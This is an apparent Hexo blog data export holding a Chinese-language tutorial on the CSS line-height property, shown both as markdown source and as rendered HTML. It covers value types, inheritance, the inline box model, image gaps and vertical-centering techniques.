为60px</span>\n</p>\n<p class=\"p2\">\n    <span>我的 font-size 为60px</span>\n</p>\n```\n\n```css\nbody{\n    width: 400px;\n}\np > span{\n    font-size: 60px;\n}\n.p1{\n    font-size: 10px;\n    line-height: 1.5;\n}\n.p2{\n    font-size: 10px;\n    line-height: 150%;\n}\n```\n\n效果：\n \n![](/assets/2016-03-16-css-line-height/3.png)\n\nline-height: 1.5 会继承这个值然后在与元素当前的 font-size 进行计算\n\n而 line-height：150% 或者 1.5em 则是先于父类 font-size 计算大小，然后再继承给子元素\n\n## 行内框盒子模型\n\n所有内联元素的样式表现都与行内框盒子模型有关 \n\n行内框模型一共包含着四种盒子\n\n先来看段 html 代码：\n\n```html\n<p>这是一行普通的文字，这里有个 <em>em</em> 标签.</p>\n```\n\n在这上面普通的文字中，其实就包含着四种盒子：\n\n* \"内容区域\" (content area) 是一种围绕文字看不见的盒子。\"内容区域\" 的大小与 font-size 大小相关;  \n\n虽然看不见，但是我们可以简单理解为下面选中的蓝色区域：  \n![](/assets/2016-03-16-css-line-height/4.png)\n\n* \"内联盒子\" (inline boxes)，\"内联盒子\" 不会让内容成块显示，而是排成一行，如果外部包含 inline 水平的标签 (span, a, em等)，则属于 \"**内联盒子**\"，如果是光秃秃的文字，则属于 \"匿名内联盒子\";\n\n![](/assets/2016-03-16-css-line-height/5.png)\n\n从图中我们可以得出，有一个内联盒子 (em 标签以及内部文字) 和两个匿名内联盒子 (em 标签两边的文字)\n\n* \"行框盒子\" (line boxes)，每一行就是一个 \"行框盒子\"，每个 \"行框盒子\" 有一个个 \"内联盒子\" (inline boxes) 组成，可以直观理解为下图：\n\n![](/assets/2016-03-16-css-line-height/6.png)\n\n* \"包含盒子\" (containing box)，此盒子由**一行行的 \"行框盒子\"** (line boxes) 组成：\n\n![](/assets/2016-03-16-css-line-height/7.png)\n\n## line-height 高度机理\n\n**内联元素**的高度是怎么而来的呢？\n\n我们都知道，如果没有给 **内联元素** 一段文字的话，内联元素其实是没有高度的，那么我们是不是可以说内联元素的高度其实是由文字撑开的？\n\n其实并不是这样的，**其实是由 line-height 决定的**，我们可以做个小实验:有两个 span 元素，className 分别为 test1，test2，并添加样式：\n\n```css\nspan {\n\tmargin: 50px;\n}\n.test1 {\n\tfont-size: 36px;\n\tline-height: 0;\n\tborder 1px solid #ccc;\n\tbackground: #eee;\n}\n.test2 {\n\tfont-size: 0;\n\tline-height: 36px;\n\tborder: 1px solid #ccc;\n\tbackground: #eee;\n}\n```\n\n![](/assets/2016-03-16-css-line-height/8.png)\n\n从图中我们可以得出，测试一虽然字体很大，但是行高为 0，故盒子内容没有撑开，只剩下边框，而测试虽然字体小到让人看不见，但是由于行高为 36px，撑起了高度。\n\n那么行高又是由什么构成的呢？\n\n它是由内容区域和行间距所组成的，它们之间的关系为:\n\n```code\n内容区域高度 ＋ 行间距 ＝ 行高\n```\n\n之前我们介绍过内容区域，内容区域高度只与字号以及字体有关，与 line-height 没有任何关系。  \n\n注：**在某些字体 (比如宋体) 下，其内容区域高度等于文字大小值，而有些字体下两者并不相等，总体来说只能说相近**\n\n那么行间距又是什么？ 行间距其实就是图中 3 的那部分\n\n![](/assets/2016-03-16-css-line-height/9.png)\n\n**行间距说白的就是为了调节行高与内容区域高度的关系的一个变量**\n\n我们假设字体大小等于内容区域高度，那么在字体大小和行高确定的情况下，行间距作为一个调解值，使之满足刚才说的关系：\n\n```code\n内容区域高度 ＋ 行间距 ＝ 行高\n```\n\n将行间距上下拆分，就有了 \"半行间距\" 的概念\n\n如果包含盒子 (containing box) 里面有多个不同行高的内联盒子，那么我们可以简单理解为由其内部**最高的行高最高的那个盒子决定**\n\n```html\n//注意：这是在没有 height 值设定的情况下\n<p style=\"line-height: 50px; background: #ccc\">\n\t这是一行普通的文字, 这里有个 <em style=\"line-height: 80px;\">em</em>\n</p>\n```\n\n这里实际上 p 元素最终的行高为 80px，尽管 p 元素样式中设置为 50px，但还是 em 内联盒子的高度所撑起。\n\n总结：  \n\n1. 行高决定了内联盒子高度\n2. 行间距可大可小，保证了高度正好等于行高\n3. 在没有 height 值干扰下，元素的高度有内部最高行高的那个盒子决定\n\n注意\n\n## 行高与图片的关系\n\n首先，行高并不会影响图片的大小，但是其中却也暗藏玄机。\n\n例如：\n\n```html\n<div class=\"box\" style=\"background: black;\">\n    <img src=\"1.png\">\n</div>\n```\n\n这里有个 div 盒子背景为黑色，里面放置一张图片，神奇的是图片下面竟多出一条黑线。\n\n![](/assets/2016-03-16-css-line-height/10.png)\n\n这段黑线究竟是什么呢？我们可以在 div 中再加入一些文字，例如：\n\n```html\n<div class=\"box\" style=\"background: black;\">\n    <img src=\"1.png\">\n    <span style=\"background: white\">我是一段文字</span>\n</div>\n```\n\n结果变成:\n\n![](/assets/2016-03-16-css-line-height/11.png)\n\n**所以下面的黑线不是由图片引起，而是由图片后的 \"隐匿文本节点\" 引起**\n\n**我们可以理解为图片后面存在着一个隐匿的文本节点 (即使图片后面没有文字)，由于文本默认是 baseline 基线对齐，故多出来的部分(黑线)就是基线到底线的距离。**\n\n### 消除图片底部间隙的方法\n\n* 图片块状化 - 块状元素无基线对齐\n\n```css\nimg{\n    display: block;\n}\n```\n\n* 图片底线对齐\n\n```css\nimg{\n\tvertical-align: bottom;\n}\n```\n\n* 父元素行高足够小\n\n```css\n.box{\n\tline-height: 0;\n}\n```\n\n## line-height 实际应用：\n\n### 实现图片水平垂直居中:\n\n例如： \n\n```html\n<div class=\"box\" style=\"line-height: 500px;text-align: center;background: #000;\">\n    <img src=\"1.png\" style=\"vertical-align: middle;\">\n</div>\n```\n\n实际效果：\n\n![](/assets/2016-03-16-css-line-height/12.png)\n\n### 实现多行文本垂直居中\n\n```html\n<div style=\"width:150px;height:100px;line-height:100px;background-color:#ccc;font-size:0;\">\n    <span style=\"display:inline-block;font-size:20px;line-height:1.4em;vertical-align:middle;\">\n        This is a test.<br/>\n        This is a test.\n    </span>\n</div>\n```\n\n效果：  \n\n![](/assets/2016-03-16-css-line-height/13.png)\n\n关键点: \n\n* 父类 font-size 大小要设为 0，不然会存在垂直偏移\n* 子类 inline-block 化\n\n### 单行文本垂直居中\n\n```html\n<div style=\"line-height:100px;border:dashed 1px #0e0;\"> \n\tThis is a test.\n</div>\n```\n\n效果：\n\n![](/assets/2016-03-16-css-line-height/14.png)\n\n参考链接：\n\n* [CSS深入理解之line-height](http://www.imooc.com/learn/403)\n* [CSS行高——line-height](http://www.cnblogs.com/dolphinX/p/3236686.html)","source":"_posts/2016-03-16-css-line-height.md","raw":"---\nlayout:     post\ntitle:      \"CSS - 深入理解 line-height 属性\"\ndate:       2016-03-16 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/14.jpg\"\ntags:\n    - CSS\n---\n\n> 最近看张鑫旭大神博客学习 CSS，发现这个 line-height 属性挺有意思，我理解归纳了下，写了一篇学习笔记。\n\n## 概念\n\nline-height 为行高，即两行文字基线之间的距离，\n\n注：**这里行高是两行文字基线之间的距离，并不是指一行文字就没有行高了，可以这么理解：两行的定义决定了一行文字的表现。**\n\n什么是基线呢？我们来看下面这张图：  \n![](/assets/2016-03-16-css-line-height/1.png)\n\n从图中我们可以得出，从上往下四条线分别叫：顶线，中线，基线，底线。  \n\n**所谓的行高是指上下文本行的基线间的垂直距离，即图中两条红线间的垂直距离。**\n\n## 属性值：\n\n```css\nelem{\n\tline-height: normal | <number> | <length> | <percent> | inherit\n}\n``` \n\n默认值：normal，与浏览器有关，且与元素字体相关\n\nnumber：line-height: 1.5;  \n根据当前元素的 font-size 大小计算\n\n```css\nelem{\n\tfont-size: 20px;\n\tline-height: 1.5;  //此时行高为 20px * 1.5 = 30px\n}\n```\n\nlength：使用具体的长度值作为行高值。例如: line-height: 20px;\n\npercent: 相对于设置了该 line-height 属性的元素的 font-size 大小计算\n\n```css\nelem{\n\tfont-size:20px;\n\tline-height: 150%;  //行高为 30px;\n}\n```\n\ninherit 继承自父元素\n\n### Q1: 行高默认是继承的，为什么还需要 inherit？\n\n行高虽然本身就是继承的，但诸如 input 等框元素默认行高是 normal，使用 inherit 可以让文本框样式可控性更强。\n\n### Q2: 元素属性对行高影响?\n\n行框高度是行内最高的行内框高度，通过 line-height 调整，内容区行高与字体尺寸有关(这个后面会讲到)，padding 不对行高造成影响。\n\n```html\n<div style=\"border:dashed 1px #000;margin-bottom:30px;\">\n    <span style=\"font-size:14px;background-color:#999;\">This is a test</span>\n</div>\n<div style=\"border:dashed 1px #000;\">\n    <span style=\"font-size:14px;padding:20px;background-color:#999;\">This is a test</span>\n</div>\n```\n\n实际效果：  \n![](/assets/2016-03-16-css-line-height/2.png)\n\n可以看出：padding 对行高不起作用。(因为它们的 span 边框高度相同)\n\n### Q3: line-height: 1.5, 150%, 1.5em 各有什么区别？\n\n首先如果你在某元素上设置了行高和字体大小，那么其实是没差的，如：\n\n```css\nelem{\n\tfont-size: 20px;\n\tline-height: 1.5 | 150% | 1.5em;   //这里行高都一样，为 30px\n}\n``` \n\n但是如果应用在元素不同则导致差异:\n\n* line-height: 1.5 所有可继承的元素根据 font-size 重计算行高\n* line-height: 150% / 1.5em 当前元素根据 font-size 计算行高，  然后继承给下面的元素\n\n来看一段例子：\n\n```html\n<p class=\"p1\">\n    <span>我的 font-size 为60px</span>\n</p>\n<p class=\"p2\">\n    <span>我的 font-size 为60px</span>\n</p>\n```\n\n```css\nbody{\n    width: 400px;\n}\np > span{\n    font-size: 60px;\n}\n.p1{\n    font-size: 10px;\n    line-height: 1.5;\n}\n.p2{\n    font-size: 10px;\n    line-height: 150%;\n}\n```\n\n效果：\n \n![](/assets/2016-03-16-css-line-height/3.png)\n\nline-height: 1.5 会继承这个值然后在与元素当前的 font-size 进行计算\n\n而 line-height：150% 或者 1.5em 则是先于父类 font-size 计算大小，然后再继承给子元素\n\n## 行内框盒子模型\n\n所有内联元素的样式表现都与行内框盒子模型有关 \n\n行内框模型一共包含着四种盒子\n\n先来看段 html 代码：\n\n```html\n<p>这是一行普通的文字，这里有个 <em>em</em> 标签.</p>\n```\n\n在这上面普通的文字中，其实就包含着四种盒子：\n\n* \"内容区域\" (content area) 是一种围绕文字看不见的盒子。\"内容区域\" 的大小与 font-size 大小相关;  \n\n虽然看不见，但是我们可以简单理解为下面选中的蓝色区域：  \n![](/assets/2016-03-16-css-line-height/4.png)\n\n* \"内联盒子\" (inline boxes)，\"内联盒子\" 不会让内容成块显示，而是排成一行，如果外部包含 inline 水平的标签 (span, a, em等)，则属于 \"**内联盒子**\"，如果是光秃秃的文字，则属于 \"匿名内联盒子\";\n\n![](/assets/2016-03-16-css-line-height/5.png)\n\n从图中我们可以得出，有一个内联盒子 (em 标签以及内部文字) 和两个匿名内联盒子 (em 标签两边的文字)\n\n* \"行框盒子\" (line boxes)，每一行就是一个 \"行框盒子\"，每个 \"行框盒子\" 有一个个 \"内联盒子\" (inline boxes) 组成，可以直观理解为下图：\n\n![](/assets/2016-03-16-css-line-height/6.png)\n\n* \"包含盒子\" (containing box)，此盒子由**一行行的 \"行框盒子\"** (line boxes) 组成：\n\n![](/assets/2016-03-16-css-line-height/7.png)\n\n## line-height 高度机理\n\n**内联元素**的高度是怎么而来的呢？\n\n我们都知道，如果没有给 **内联元素** 一段文字的话，内联元素其实是没有高度的，那么我们是不是可以说内联元素的高度其实是由文字撑开的？\n\n其实并不是这样的，**其实是由 line-height 决定的**，我们可以做个小实验:有两个 span 元素，className 分别为 test1，test2，并添加样式：\n\n```css\nspan {\n\tmargin: 50px;\n}\n.test1 {\n\tfont-size: 36px;\n\tline-height: 0;\n\tborder 1px solid #ccc;\n\tbackground: #eee;\n}\n.test2 {\n\tfont-size: 0;\n\tline-height: 36px;\n\tborder: 1px solid #ccc;\n\tbackground: #eee;\n}\n```\n\n![](/assets/2016-03-16-css-line-height/8.png)\n\n从图中我们可以得出，测试一虽然字体很大，但是行高为 0，故盒子内容没有撑开，只剩下边框，而测试虽然字体小到让人看不见，但是由于行高为 36px，撑起了高度。\n\n那么行高又是由什么构成的呢？\n\n它是由内容区域和行间距所组成的，它们之间的关系为:\n\n```code\n内容区域高度 ＋ 行间距 ＝ 行高\n```\n\n之前我们介绍过内容区域，内容区域高度只与字号以及字体有关，与 line-height 没有任何关系。  \n\n注：**在某些字体 (比如宋体) 下，其内容区域高度等于文字大小值，而有些字体下两者并不相等，总体来说只能说相近**\n\n那么行间距又是什么？ 行间距其实就是图中 3 的那部分\n\n![](/assets/2016-03-16-css-line-height/9.png)\n\n**行间距说白的就是为了调节行高与内容区域高度的关系的一个变量**\n\n我们假设字体大小等于内容区域高度，那么在字体大小和行高确定的情况下，行间距作为一个调解值，使之满足刚才说的关系：\n\n```code\n内容区域高度 ＋ 行间距 ＝ 行高\n```\n\n将行间距上下拆分，就有了 \"半行间距\" 的概念\n\n如果包含盒子 (containing box) 里面有多个不同行高的内联盒子，那么我们可以简单理解为由其内部**最高的行高最高的那个盒子决定**\n\n```html\n//注意：这是在没有 height 值设定的情况下\n<p style=\"line-height: 50px; background: #ccc\">\n\t这是一行普通的文字, 这里有个 <em style=\"line-height: 80px;\">em</em>\n</p>\n```\n\n这里实际上 p 元素最终的行高为 80px，尽管 p 元素样式中设置为 50px，但还是 em 内联盒子的高度所撑起。\n\n总结：  \n\n1. 行高决定了内联盒子高度\n2. 行间距可大可小，保证了高度正好等于行高\n3. 在没有 height 值干扰下，元素的高度有内部最高行高的那个盒子决定\n\n注意\n\n## 行高与图片的关系\n\n首先，行高并不会影响图片的大小，但是其中却也暗藏玄机。\n\n例如：\n\n```html\n<div class=\"box\" style=\"background: black;\">\n    <img src=\"1.png\">\n</div>\n```\n\n这里有个 div 盒子背景为黑色，里面放置一张图片，神奇的是图片下面竟多出一条黑线。\n\n![](/assets/2016-03-16-css-line-height/10.png)\n\n这段黑线究竟是什么呢？我们可以在 div 中再加入一些文字，例如：\n\n```html\n<div class=\"box\" style=\"background: black;\">\n    <img src=\"1.png\">\n    <span style=\"background: white\">我是一段文字</span>\n</div>\n```\n\n结果变成:\n\n![](/assets/2016-03-16-css-line-height/11.png)\n\n**所以下面的黑线不是由图片引起，而是由图片后的 \"隐匿文本节点\" 引起**\n\n**我们可以理解为图片后面存在着一个隐匿的文本节点 (即使图片后面没有文字)，由于文本默认是 baseline 基线对齐，故多出来的部分(黑线)就是基线到底线的距离。**\n\n### 消除图片底部间隙的方法\n\n* 图片块状化 - 块状元素无基线对齐\n\n```css\nimg{\n    display: block;\n}\n```\n\n* 图片底线对齐\n\n```css\nimg{\n\tvertical-align: bottom;\n}\n```\n\n* 父元素行高足够小\n\n```css\n.box{\n\tline-height: 0;\n}\n```\n\n## line-height 实际应用：\n\n### 实现图片水平垂直居中:\n\n例如： \n\n```html\n<div class=\"box\" style=\"line-height: 500px;text-align: center;background: #000;\">\n    <img src=\"1.png\" style=\"vertical-align: middle;\">\n</div>\n```\n\n实际效果：\n\n![](/assets/2016-03-16-css-line-height/12.png)\n\n### 实现多行文本垂直居中\n\n```html\n<div style=\"width:150px;height:100px;line-height:100px;background-color:#ccc;font-size:0;\">\n    <span style=\"display:inline-block;font-size:20px;line-height:1.4em;vertical-align:middle;\">\n        This is a test.<br/>\n        This is a test.\n    </span>\n</div>\n```\n\n效果：  \n\n![](/assets/2016-03-16-css-line-height/13.png)\n\n关键点: \n\n* 父类 font-size 大小要设为 0，不然会存在垂直偏移\n* 子类 inline-block 化\n\n### 单行文本垂直居中\n\n```html\n<div style=\"line-height:100px;border:dashed 1px #0e0;\"> \n\tThis is a test.\n</div>\n```\n\n效果：\n\n![](/assets/2016-03-16-css-line-height/14.png)\n\n参考链接：\n\n* [CSS深入理解之line-height](http://www.imooc.com/learn/403)\n* [CSS行高——line-height](http://www.cnblogs.com/dolphinX/p/3236686.html)","slug":"2016-03-16-css-line-height","published":1,"updated":"2016-03-16T13:37:18.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6ry2000qxmvdpfl9ttsu","content":"<blockquote>\n<p>最近看张鑫旭大神博客学习 CSS，发现这个 line-height 属性挺有意思，我理解归纳了下，写了一篇学习笔记。</p>\n</blockquote>\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>line-height 为行高，即两行文字基线之间的距离，</p>\n<p>注：<strong>这里行高是两行文字基线之间的距离，并不是指一行文字就没有行高了，可以这么理解：两行的定义决定了一行文字的表现。</strong></p>\n<p>什么是基线呢？我们来看下面这张图：<br><img src=\"/assets/2016-03-16-css-line-height/1.png\" alt=\"\"></p>\n<p>从图中我们可以得出，从上往下四条线分别叫：顶线，中线，基线，底线。  </p>\n<p><strong>所谓的行高是指上下文本行的基线间的垂直距离，即图中两条红线间的垂直距离。</strong></p>\n<h2 id=\"属性值：\"><a href=\"#属性值：\" class=\"headerlink\" title=\"属性值：\"></a>属性值：</h2><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tline-height: normal | &lt;number&gt; | &lt;length&gt; | &lt;percent&gt; | inherit</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">默认值：normal，与浏览器有关，且与元素字体相关</span><br><span class=\"line\"></span><br><span class=\"line\">number：line-height: 1.5;  </span><br><span class=\"line\">根据当前元素的 font-size 大小计算</span><br><span class=\"line\"></span><br><span class=\"line\">```css</span><br><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tfont-size: 20px;</span><br><span class=\"line\">\tline-height: 1.5;  //此时行高为 20px * 1.5 = 30px</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>length：使用具体的长度值作为行高值。例如: line-height: 20px;</p>\n<p>percent: 相对于设置了该 line-height 属性的元素的 font-size 大小计算</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tfont-size:20px;</span><br><span class=\"line\">\tline-height: 150%;  //行高为 30px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>inherit 继承自父元素</p>\n<h3 id=\"Q1-行高默认是继承的，为什么还需要-inherit？\"><a href=\"#Q1-行高默认是继承的，为什么还需要-inherit？\" class=\"headerlink\" title=\"Q1: 行高默认是继承的，为什么还需要 inherit？\"></a>Q1: 行高默认是继承的，为什么还需要 inherit？</h3><p>行高虽然本身就是继承的，但诸如 input 等框元素默认行高是 normal，使用 inherit 可以让文本框样式可控性更强。</p>\n<h3 id=\"Q2-元素属性对行高影响\"><a href=\"#Q2-元素属性对行高影响\" class=\"headerlink\" title=\"Q2: 元素属性对行高影响?\"></a>Q2: 元素属性对行高影响?</h3><p>行框高度是行内最高的行内框高度，通过 line-height 调整，内容区行高与字体尺寸有关(这个后面会讲到)，padding 不对行高造成影响。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border:dashed 1px #000;margin-bottom:30px;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-size:14px;background-color:#999;\"</span>&gt;</span>This is a test<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border:dashed 1px #000;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-size:14px;padding:20px;background-color:#999;\"</span>&gt;</span>This is a test<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>实际效果：<br><img src=\"/assets/2016-03-16-css-line-height/2.png\" alt=\"\"></p>\n<p>可以看出：padding 对行高不起作用。(因为它们的 span 边框高度相同)</p>\n<h3 id=\"Q3-line-height-1-5-150-1-5em-各有什么区别？\"><a href=\"#Q3-line-height-1-5-150-1-5em-各有什么区别？\" class=\"headerlink\" title=\"Q3: line-height: 1.5, 150%, 1.5em 各有什么区别？\"></a>Q3: line-height: 1.5, 150%, 1.5em 各有什么区别？</h3><p>首先如果你在某元素上设置了行高和字体大小，那么其实是没差的，如：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tfont-size: 20px;</span><br><span class=\"line\">\tline-height: 1.5 | 150% | 1.5em;   //这里行高都一样，为 30px</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">但是如果应用在元素不同则导致差异:</span><br><span class=\"line\"></span><br><span class=\"line\">* line-height: 1.5 所有可继承的元素根据 font-size 重计算行高</span><br><span class=\"line\">* line-height: 150% / 1.5em 当前元素根据 font-size 计算行高，  然后继承给下面的元素</span><br><span class=\"line\"></span><br><span class=\"line\">来看一段例子：</span><br><span class=\"line\"></span><br><span class=\"line\">```html</span><br><span class=\"line\">&lt;p class=\"p1\"&gt;</span><br><span class=\"line\">    &lt;span&gt;我的 font-size 为60px&lt;/span&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=\"p2\"&gt;</span><br><span class=\"line\">    &lt;span&gt;我的 font-size 为60px&lt;/span&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">400px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &gt; <span class=\"selector-tag\">span</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.p1</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">1.5</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.p2</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">150%</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/3.png\" alt=\"\"></p>\n<p>line-height: 1.5 会继承这个值然后在与元素当前的 font-size 进行计算</p>\n<p>而 line-height：150% 或者 1.5em 则是先于父类 font-size 计算大小，然后再继承给子元素</p>\n<h2 id=\"行内框盒子模型\"><a href=\"#行内框盒子模型\" class=\"headerlink\" title=\"行内框盒子模型\"></a>行内框盒子模型</h2><p>所有内联元素的样式表现都与行内框盒子模型有关 </p>\n<p>行内框模型一共包含着四种盒子</p>\n<p>先来看段 html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一行普通的文字，这里有个 <span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span>em<span class=\"tag\">&lt;/<span class=\"name\">em</span>&gt;</span> 标签.<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在这上面普通的文字中，其实就包含着四种盒子：</p>\n<ul>\n<li>“内容区域” (content area) 是一种围绕文字看不见的盒子。”内容区域” 的大小与 font-size 大小相关;  </li>\n</ul>\n<p>虽然看不见，但是我们可以简单理解为下面选中的蓝色区域：<br><img src=\"/assets/2016-03-16-css-line-height/4.png\" alt=\"\"></p>\n<ul>\n<li>“内联盒子” (inline boxes)，”内联盒子” 不会让内容成块显示，而是排成一行，如果外部包含 inline 水平的标签 (span, a, em等)，则属于 “<strong>内联盒子</strong>“，如果是光秃秃的文字，则属于 “匿名内联盒子”;</li>\n</ul>\n<p><img src=\"/assets/2016-03-16-css-line-height/5.png\" alt=\"\"></p>\n<p>从图中我们可以得出，有一个内联盒子 (em 标签以及内部文字) 和两个匿名内联盒子 (em 标签两边的文字)</p>\n<ul>\n<li>“行框盒子” (line boxes)，每一行就是一个 “行框盒子”，每个 “行框盒子” 有一个个 “内联盒子” (inline boxes) 组成，可以直观理解为下图：</li>\n</ul>\n<p><img src=\"/assets/2016-03-16-css-line-height/6.png\" alt=\"\"></p>\n<ul>\n<li>“包含盒子” (containing box)，此盒子由<strong>一行行的 “行框盒子”</strong> (line boxes) 组成：</li>\n</ul>\n<p><img src=\"/assets/2016-03-16-css-line-height/7.png\" alt=\"\"></p>\n<h2 id=\"line-height-高度机理\"><a href=\"#line-height-高度机理\" class=\"headerlink\" title=\"line-height 高度机理\"></a>line-height 高度机理</h2><p><strong>内联元素</strong>的高度是怎么而来的呢？</p>\n<p>我们都知道，如果没有给 <strong>内联元素</strong> 一段文字的话，内联元素其实是没有高度的，那么我们是不是可以说内联元素的高度其实是由文字撑开的？</p>\n<p>其实并不是这样的，<strong>其实是由 line-height 决定的</strong>，我们可以做个小实验:有两个 span 元素，className 分别为 test1，test2，并添加样式：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">span &#123;</span><br><span class=\"line\">\tmargin: 50px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.test1 &#123;</span><br><span class=\"line\">\tfont-size: 36px;</span><br><span class=\"line\">\tline-height: 0;</span><br><span class=\"line\">\tborder 1px solid #ccc;</span><br><span class=\"line\">\tbackground: #eee;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.test2 &#123;</span><br><span class=\"line\">\tfont-size: 0;</span><br><span class=\"line\">\tline-height: 36px;</span><br><span class=\"line\">\tborder: 1px solid #ccc;</span><br><span class=\"line\">\tbackground: #eee;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-16-css-line-height/8.png\" alt=\"\"></p>\n<p>从图中我们可以得出，测试一虽然字体很大，但是行高为 0，故盒子内容没有撑开，只剩下边框，而测试虽然字体小到让人看不见，但是由于行高为 36px，撑起了高度。</p>\n<p>那么行高又是由什么构成的呢？</p>\n<p>它是由内容区域和行间距所组成的，它们之间的关系为:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内容区域高度 ＋ 行间距 ＝ 行高</span><br></pre></td></tr></table></figure>\n<p>之前我们介绍过内容区域，内容区域高度只与字号以及字体有关，与 line-height 没有任何关系。  </p>\n<p>注：<strong>在某些字体 (比如宋体) 下，其内容区域高度等于文字大小值，而有些字体下两者并不相等，总体来说只能说相近</strong></p>\n<p>那么行间距又是什么？ 行间距其实就是图中 3 的那部分</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/9.png\" 